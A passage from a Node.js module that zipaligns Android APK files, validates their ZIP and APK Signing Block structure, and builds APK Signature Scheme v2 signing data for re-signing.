    cleanMode: opts.cleanMode,
  };
}

// ═══════════════════════════════════════════════════════════════════════════
// ZIP ALIGNMENT (zipalign equivalent)
// ═══════════════════════════════════════════════════════════════════════════

/**
 * Align uncompressed (STORE) ZIP entries to 4-byte boundaries.
 * This mimics Android's `zipalign` tool.
 *
 * Without alignment, entries like resources.arsc can't be memory-mapped
 * and Android's PackageParser will reject the APK with "App not installed"
 * on many devices (especially Samsung, Xiaomi, and Android 11+).
 *
 * Works by adjusting the 'extra' field length in each local file header
 * so that the entry's data starts on a 4-byte aligned offset.
 */
function zipalignBuffer(inputBuf, log) {
  const eocdOff = findEOCD(inputBuf);
  const cdOff = inputBuf.readUInt32LE(eocdOff + 16);
  const cdEntryCount = inputBuf.readUInt16LE(eocdOff + 10);
  const eocdLen = inputBuf.length - eocdOff;

  // Parse central directory entries
  const entries = [];
  let pos = cdOff;
  for (let i = 0; i < cdEntryCount; i++) {
    if (inputBuf.readUInt32LE(pos) !== 0x02014b50) {
      throw new Error(`Invalid CD entry signature at offset ${pos}`);
    }

    const flags = inputBuf.readUInt16LE(pos + 8);
    const method = inputBuf.readUInt16LE(pos + 10);
    const compSize = inputBuf.readUInt32LE(pos + 20);
    const nameLen = inputBuf.readUInt16LE(pos + 28);
    const cdExtraLen = inputBuf.readUInt16LE(pos + 30);
    const commentLen = inputBuf.readUInt16LE(pos + 32);
    const localHeaderOff = inputBuf.readUInt32LE(pos + 42);

    const entryName = inputBuf.toString('utf8', pos + 46, pos + 46 + nameLen);
    const cdEntryLen = 46 + nameLen + cdExtraLen + commentLen;
    entries.push({ cdOffset: pos, cdEntryLen, localHeaderOff, flags, method, compSize, nameLen, entryName });
    pos += cdEntryLen;
  }

  // Critical check: resources.arsc MUST be STORED (method=0) for Android
  const resArsc = entries.find(e => e.entryName === 'resources.arsc');
  if (resArsc && resArsc.method !== 0) {
    if (log) log('ZIPALIGN', 'WARNING: resources.arsc is DEFLATED (method=' + resArsc.method + ') — some devices will reject this APK', 'warn');
  }

  // Sort by local header offset for sequential processing
  entries.sort((a, b) => a.localHeaderOff - b.localHeaderOff);

  const ALIGNMENT = 4;
  const outChunks = [];
  let writeOffset = 0;
  let aligned = 0;

  for (const entry of entries) {
    const lhOff = entry.localHeaderOff;
    if (inputBuf.readUInt32LE(lhOff) !== 0x04034b50) {
      throw new Error(`Invalid local header at offset ${lhOff}`);
    }

    const lhNameLen = inputBuf.readUInt16LE(lhOff + 26);
    const lhExtraLen = inputBuf.readUInt16LE(lhOff + 28);
    const dataStart = lhOff + 30 + lhNameLen + lhExtraLen;
    const dataSize = entry.compSize;

    if (entry.method === 0) {
      // STORED entry — needs alignment padding for its data
      const headerPlusName = 30 + lhNameLen;
      const baseOffset = writeOffset + headerPlusName;
      const currentMod = baseOffset % ALIGNMENT;
      const padNeeded = currentMod === 0 ? 0 : ALIGNMENT - currentMod;

      // Copy local header + name (without extra field)
      const header = Buffer.from(inputBuf.slice(lhOff, lhOff + headerPlusName));
      header.writeUInt16LE(padNeeded, 28); // update extra field length

      outChunks.push(header);
      if (padNeeded > 0) outChunks.push(Buffer.alloc(padNeeded, 0));
      outChunks.push(inputBuf.slice(dataStart, dataStart + dataSize));

      entry.newLocalHeaderOff = writeOffset;
      writeOffset += headerPlusName + padNeeded + dataSize;
      aligned++;
    } else {
      // DEFLATED entry — copy as-is (no alignment needed for compressed data)
      const totalSize = 30 + lhNameLen + lhExtraLen + dataSize;
      outChunks.push(inputBuf.slice(lhOff, lhOff + totalSize));

      entry.newLocalHeaderOff = writeOffset;
      writeOffset += totalSize;
    }

    // Handle data descriptor (bit 3 of flags)
    if (entry.flags & 0x0008) {
      const ddOff = dataStart + dataSize;
      let ddSize = 12; // CRC32 + compSize + uncompSize
      if (ddOff + 4 <= inputBuf.length && inputBuf.readUInt32LE(ddOff) === 0x08074b50) {
        ddSize = 16; // with optional signature
      }
      outChunks.push(inputBuf.slice(ddOff, ddOff + ddSize));
      writeOffset += ddSize;
    }
  }

  // Rebuild central directory with updated local header offsets
  const newCDOffset = writeOffset;
  for (const entry of entries) {
    const cdEntry = Buffer.from(inputBuf.slice(entry.cdOffset, entry.cdOffset + entry.cdEntryLen));
    cdEntry.writeUInt32LE(entry.newLocalHeaderOff, 42);
    outChunks.push(cdEntry);
    writeOffset += cdEntry.length;
  }

  // Rebuild EOCD with updated CD offset
  const eocd = Buffer.from(inputBuf.slice(eocdOff, eocdOff + eocdLen));
  eocd.writeUInt32LE(writeOffset - newCDOffset, 12); // CD size
  eocd.writeUInt32LE(newCDOffset, 16); // CD offset
  outChunks.push(eocd);

  if (log) {
    log('ZIPALIGN', `Aligned ${aligned} STORE entries to ${ALIGNMENT}-byte boundaries`, 'info');
  }

  return Buffer.concat(outChunks);
}

/**
 * Validate the final APK structure after v2 signing.
 * Checks EOCD, Central Directory, and APK Signing Block integrity.
 */
function validateApk(buf, log) {
  try {
    // 1. Find and validate EOCD
    const eocdOff = findEOCD(buf);
    const cdOff = buf.readUInt32LE(eocdOff + 16);
    const cdSize = buf.readUInt32LE(eocdOff + 12);
    const entryCount = buf.readUInt16LE(eocdOff + 10);

    if (cdOff >= buf.length || cdOff + cdSize > buf.length) {
      throw new Error(`Invalid CD offset/size: off=${cdOff} size=${cdSize} total=${buf.length}`);
    }

    // 2. Validate Central Directory entries + check resources.arsc
    let pos = cdOff;
    let hasResArsc = false;
    let resArscMethod = -1;
    for (let i = 0; i < entryCount; i++) {
      if (buf.readUInt32LE(pos) !== 0x02014b50) {
        throw new Error(`Invalid CD entry ${i} at offset ${pos}`);
      }
      const method = buf.readUInt16LE(pos + 10);
      const nameLen = buf.readUInt16LE(pos + 28);
      const extraLen = buf.readUInt16LE(pos + 30);
      const commentLen = buf.readUInt16LE(pos + 32);
      const localOff = buf.readUInt32LE(pos + 42);
      const name = buf.toString('utf8', pos + 46, pos + 46 + nameLen);

      // Verify local header is accessible
      if (localOff + 30 > cdOff) {
        throw new Error(`Entry ${i} local header offset ${localOff} is past CD start ${cdOff}`);
      }

      // Check resources.arsc is STORED (critical for Android)
      if (name === 'resources.arsc') {
        hasResArsc = true;
        resArscMethod = method;
        if (method !== 0) {
          if (log) log('VALIDATE', `WARNING: resources.arsc is DEFLATED (method=${method}) — may cause install failure`, 'warn');
        }
        // Verify 4-byte alignment
        const lhNameLen = buf.readUInt16LE(localOff + 26);
        const lhExtraLen = buf.readUInt16LE(localOff + 28);
        const dataOffset = localOff + 30 + lhNameLen + lhExtraLen;
        if (method === 0 && dataOffset % 4 !== 0) {
          if (log) log('VALIDATE', `WARNING: resources.arsc data not 4-byte aligned (offset=${dataOffset})`, 'warn');
        }
      }

      pos += 46 + nameLen + extraLen + commentLen;
    }

    // 3. Check APK Signing Block exists before CD
    const magic = buf.toString('ascii', cdOff - 16, cdOff);
    if (magic !== APK_SIG_BLOCK_MAGIC) {
      throw new Error('APK Signing Block magic not found before Central Directory');
    }

    // 4. Read signing block size and verify
    const blockSize = buf.readUInt32LE(cdOff - 24); // second size field (low 32 bits)
    if (blockSize < 32 || blockSize > cdOff) {
      throw new Error(`Invalid signing block size: ${blockSize}`);
    }

    // 5. Verify v2 signing pair exists in the signing block
    const sigBlockStart = cdOff - blockSize - 8; // 8 = first size field
    const pairsStart = sigBlockStart + 8; // skip first size field
    const pairsEnd = cdOff - 24; // before second size + magic
    let pairPos = pairsStart;
    let foundV2 = false;
    while (pairPos + 12 <= pairsEnd) {
      const pairSizeLo = buf.readUInt32LE(pairPos);
      const pairSizeHi = buf.readUInt32LE(pairPos + 4);
      if (pairSizeHi !== 0 || pairSizeLo < 4) break; // safety
      const pairId = buf.readUInt32LE(pairPos + 8);
      if (pairId === V2_BLOCK_ID) foundV2 = true;
      pairPos += 8 + pairSizeLo;
    }

    if (!foundV2) {
      throw new Error('APK Signing Block missing v2 signature pair (0x7109871a)');
    }

    if (log) {
      log('VALIDATE', `APK OK: ${entryCount} entries, CD@${cdOff}, signing=v1+v2, resources.arsc=${hasResArsc ? (resArscMethod === 0 ? 'STORED✓' : 'DEFLATED✗') : 'missing'}`, 'success');
    }
    return true;
  } catch (e) {
    if (log) {
      log('VALIDATE', `APK validation FAILED: ${e.message}`, 'error');
    }
    return false;
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// V2 SIGNING INFRASTRUCTURE
// ═══════════════════════════════════════════════════════════════════════════

function findEOCD(buf) {
  const searchStart = Math.max(0, buf.length - 65557);
  for (let i = buf.length - 22; i >= searchStart; i--) {
    if (buf.readUInt32LE(i) === EOCD_MAGIC) {
      return i;
    }
  }
  throw new Error('ZIP EOCD not found — invalid APK');
}

function computeV2ContentDigest(section1, section2, section3) {
  const sections = [section1, section2, section3];
  const chunkDigests = [];

  for (const section of sections) {
    const numChunks = Math.ceil(section.length / CHUNK_SIZE);
    for (let i = 0; i < numChunks; i++) {
      const start = i * CHUNK_SIZE;
      const end = Math.min(start + CHUNK_SIZE, section.length);
      const chunk = section.slice(start, end);

      const prefix = Buffer.alloc(5);
      prefix[0] = 0xa5;
      prefix.writeUInt32LE(chunk.length, 1);

      chunkDigests.push(
        crypto.createHash('sha256').update(prefix).update(chunk).digest()
      );
    }
  }

  const topPrefix = Buffer.alloc(5);
  topPrefix[0] = 0x5a;
  topPrefix.writeUInt32LE(chunkDigests.length, 1);

  const topHash = crypto.createHash('sha256');
  topHash.update(topPrefix);
  for (const d of chunkDigests) topHash.update(d);

  return topHash.digest();
}

function uint32LE(value) {
  const buf = Buffer.alloc(4);
  buf.writeUInt32LE(value >>> 0, 0);
  return buf;
}

function uint64LE(value) {
  const buf = Buffer.alloc(8);
  buf.writeUInt32LE(value & 0xFFFFFFFF, 0);
  buf.writeUInt32LE(Math.floor(value / 0x100000000) & 0xFFFFFFFF, 4);
  return buf;
}

function buildV2SignedData(contentDigest, certDer) {
  const digestsEncoded = Buffer.concat([
    uint32LE(4 + 4 + contentDigest.length),
    uint32LE(SIG_RSA_PKCS1_V1_5_WITH_SHA256),
    uint32LE(contentDigest.length),
    contentDigest,
  ]);

  const certsEncoded = Buffer.concat([
    uint32LE(certDer.length),
    certDer,
  ]);

  return Buffer.concat([
    uint32LE(digestsEncoded.length), digestsEncoded,
    uint32LE(certsEncoded.length),   certsEncoded,
    uint32LE(0),
  ]);
}

function buildV2Signer(signedData, signature, pubKeyDer) {
  const sigsEncoded = Buffer.concat([
    uint32LE(4 + 4 + signature.length),
    uint32LE(SIG_RSA_PKCS1_V1_5_WITH_SHA256),
    uint32LE(signature.length),
    signature,
  ]);

  return Buffer.concat([
    uint32LE(signedData.length),  signedData,
    uint32LE(sigsEncoded.length), sigsEncoded,
    uint32LE(pubKeyDer.length),   pubKeyDer,
  ]);
}

function buildApkSigningBlock(signerBlock) {
  const signerLP = Buffer.concat([
    uint32LE(signerBlock.length),
    signerBlock,
  ]);

  const v2Value = Buffer.concat([
    uint32LE(signerLP.length),
    signerLP,
  ]);

  const pairData = Buffer.concat([
    uint32LE(V2_BLOCK_ID),
    v2Value,
  ]);

  const pairEntry = Buffer.concat([
    uint64LE(pairData.length),
    pairData,
  ]);

  const blockSize = pairEntry.length + 8 + 16;
  const magic = Buffer.from(APK_SIG_BLOCK_MAGIC, 'ascii');

  return Buffer.concat([
    uint64LE(blockSize),
    pairEntry,
    uint64LE(blockSize),
    magic,
  ]);
}

module.exports = { resignApk };
